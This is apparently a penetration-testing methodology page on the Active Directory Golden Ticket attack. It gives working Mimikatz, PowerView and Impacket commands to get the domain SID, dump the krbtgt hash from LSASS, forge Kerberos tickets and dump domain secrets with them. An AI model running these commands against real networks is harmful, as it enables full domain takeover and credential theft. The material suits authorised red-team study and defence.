# Golden Ticket

#### Priv Required: <mark style="color:purple;">Domain Admin account</mark>

A **Golden Ticket attack** consist on the **creation** of a legitimate Ticket Granding Ticket (TGT) **impersonating any user** through the use of the NTLM hash of the Acrive Directory (AD) **krbtgt account**.\
This tenchnique is particularly advantageos because it enables access to any service or machine within the domain as the impersonated user. It's crucial to remember that the krbtgt account's credentials are never automatically updated.

#### Necessary Elements:

* **Domain SID**
* **NTLM hash** of **krbtgt account**

#### Methodology:

* Extract **Domain Admin** account's **NTML hash**
* Execute **Pass-the-Hash**
* Retrive **KRBTGT Account hash**
* **Forge** and use a Golden Ticket

## Get Domain Info

### SID

{% code title="From Windows" %}
```powershell
powershell -ep bypass
. .\PowerView.ps1

Get-DomainSID
```
{% endcode %}

{% code title="From Linux - Impacket" %}
```bash
cd /usr/share/doc/python3-impacket/examples/ # Kali location
lookupsid.py -hashes '$LMhash:$NThash' '$DOMAIN/$USER@$DOMAIN_CONTROLLER' 0
```
{% endcode %}

## Get Domain Admin Account

the first task is obtained a Domain Admin user account with elevated privilege into Domain Controller.

We can use Pass-the-Hash, crack password hash or find plain-text password.

{% content-ref url="../ad-lateral-movement/pass-the-hash.md" %}
[pass-the-hash.md](../ad-lateral-movement/pass-the-hash.md)
{% endcontent-ref %}

{% content-ref url="../ad-enumeration/password-sprayng.md" %}
[password-sprayng.md](../ad-enumeration/password-sprayng.md)
{% endcontent-ref %}

{% content-ref url="../ad-privilege-escalation/kerberoasting.md" %}
[kerberoasting.md](../ad-privilege-escalation/kerberoasting.md)
{% endcontent-ref %}



## Get krbtgt's NTLM hash

The second task is obtain the NTLM hash of the krbtgt account. These are the methods to obtain it:

### LSASS

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computer $DC_NANE.local
```

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

### NT Directory Services (NTDS.dll)

...

### DCsync attack



To acquire the NTLM hash of the krbtgt account, various methods can be employed. It can be extracted from the Local Security Authority Subsystem (LSASS) process or the NT Directory Services (NTDS.dll) file located on any Domain controller (DC) within the domain.\
Furthermore, executing a DCsync attack is another strategy to obtain this NTLM hash, which can be performed using tools such as the "lsadump::dcsync" in Mimikatz or the secretsdump.py script by Impacket. It's important to unserscore that to undertake these operations, domain admin pribileges or a similar level of access is typically required.



## Forge Golden Ticket



{% code title="From Windows - Invoke-Mimikatz" overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$DOMAIN.local /sid:$DOMAIN_SID /krbtgt:$NTLM_HASH_KRBTGT /id:500 /groups:512 /startoffset:0 /end:600 /renewmax:10080 /ptt"'
```
{% endcode %}

> id:**500** or id:**512** it's a default id of administrator user in windows



{% code title="From Linux - Impacket" overflow="wrap" %}
```bash
cd /usr/share/doc/python3-impacket/examples/
# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "$RANDOMUSER"

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
```
{% endcode %}



## Use Golden Ticket

### secretsdump.py

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=$(pwd)/NAME.ccache

KRB5CCNAME="NAME.ccache" secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NAME@$MACHINE.$DOMAIN.local
```
{% endcode %}



## GolenCopy

You encounter limitations with your golden tickets (DACLs, detection)? GoldenCopy retrieves all the information (ID, groups, etc) of a specific user in a neo4j database (bloodhound) and prepares the mimikatz/ticketer command to impersonate his permissions.

{% embed url="https://github.com/Dramelac/GoldenCopy" %}



## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden" %}







